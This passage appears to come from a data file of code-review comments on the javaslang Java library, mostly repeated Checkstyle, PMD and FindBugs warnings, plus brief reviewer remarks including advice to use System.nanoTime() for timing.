'^[A-Z]$'.. [Checkstyle] ERROR: Name 'Function' must match pattern '^[a-z][a-zA-Z0-9]*$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T6' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T7' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'Function' must match pattern '^[a-z][a-zA-Z0-9]*$'.. [Checkstyle] ERROR: Assignment of parameter 'array' is not allowed.. [Checkstyle] ERROR: Fields and methods should be before inner classes.. [Checkstyle] ERROR: '{' at column 43 should have line break after.. [PMD] INFO: Ensure you override both equals() and hashCode(). [FindBugs] INFO: RV: Return value of Try.andFinallyTry(Try$CheckedRunnable) ignored, is this OK in javaslang.control.TryTest.shouldExecuteAndFinallyTryOnSuccess(). [FindBugs] INFO: RV: Return value of Try.andFinallyTry(Try$CheckedRunnable) ignored, is this OK in javaslang.control.TryTest.shouldExecuteAndFinallyTryOnFailure(). [PMD] INFO: Ensure you override both equals() and hashCode(). [PMD] INFO: Ensure you override both equals() and hashCode(). [PMD] INFO: Ensure you override both equals() and hashCode(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldAddSelf(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldRecognizeListContainsSelf(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldRecognizeListContainsAllSelf(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldRecognizeSelfEqualityOfListThatContainsItself(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldThrowInsteadOfLoopingInfinitelyWhenComputingHashCodeOfListThatContainsItself(). [FindBugs] WARNING: DMI: Collections should not contain themselves in call to java.util.List.contains(Object). [FindBugs] INFO: DMI: For any collection c, calling c.containsAll(c) doesn't make sense . [PMD] INFO: Ensure you override both equals() and hashCode(). [PMD] INFO: Ensure you override both equals() and hashCode(). [PMD] INFO: Ensure you override both equals() and hashCode(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldAddSelf(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldRecognizeListContainsSelf(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldRecognizeListContainsAllSelf(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldRecognizeSelfEqualityOfListThatContainsItself(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldThrowInsteadOfLoopingInfinitelyWhenComputingHashCodeOfListThatContainsItself(). [FindBugs] WARNING: DMI: Collections should not contain themselves in call to java.util.List.contains(Object). [FindBugs] INFO: DMI: For any collection c, calling c.containsAll(c) doesn't make sense . [PMD] INFO: Ensure you override both equals() and hashCode(). [PMD] INFO: Ensure you override both equals() and hashCode(). [PMD] INFO: Ensure you override both equals() and hashCode(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldAddSelf(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldRecognizeListContainsSelf(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldRecognizeListContainsAllSelf(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldRecognizeSelfEqualityOfListThatContainsItself(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldThrowInsteadOfLoopingInfinitelyWhenComputingHashCodeOfListThatContainsItself(). [FindBugs] WARNING: DMI: Collections should not contain themselves in call to java.util.List.contains(Object). [FindBugs] INFO: DMI: For any collection c, calling c.containsAll(c) doesn't make sense . [PMD] INFO: Ensure you override both equals() and hashCode(). [PMD] INFO: Ensure you override both equals() and hashCode(). [PMD] INFO: Ensure you override both equals() and hashCode(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldAddSelf(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldRecognizeListContainsSelf(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldRecognizeListContainsAllSelf(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldRecognizeSelfEqualityOfListThatContainsItself(). [FindBugs] INFO: IL: A collection is added to itself in javaslang.collection.JavaConverters_ListViewMutableTest.shouldThrowInsteadOfLoopingInfinitelyWhenComputingHashCodeOfListThatContainsItself(). [FindBugs] WARNING: DMI: Collections should not contain themselves in call to java.util.List.contains(Object). [FindBugs] INFO: DMI: For any collection c, calling c.containsAll(c) doesn't make sense . [PMD] INFO: Ensure you override both equals() and hashCode(). [PMD] INFO: Ensure you override both equals() and hashCode(). [PMD] INFO: Ensure you override both equals() and hashCode(). [FindBugs] INFO: RV: Return value of Try.andFinallyTry(Try$CheckedRunnable) ignored, is this OK in javaslang.control.TryTest.shouldExecuteAndFinallyTryOnSuccess(). [FindBugs] INFO: RV: Return value of Try.andFinallyTry(Try$CheckedRunnable) ignored, is this OK in javaslang.control.TryTest.shouldExecuteAndFinallyTryOnFailure(). ",
    "happyser": "sorry my bad. ",
    "serp92": "Fixed. Fixed. Fixed. Fixed. Addressed all the comments. Fixed. Fixed. ",
    "tedyoung": "For elapsed time measurements, should use System.nanoTime() and not the date-time APIs nor currentTimeMillis(). See https://docs.oracle.com/javase/8/docs/api/java/lang/System.html#nanoTime-- for details -- mainly that nanoTime is guaranteed to be monotonic increasing (on most systems), whereas the date time APIs (which are based on currentTimeMillis) can move around during time changes and adjustments.. "
}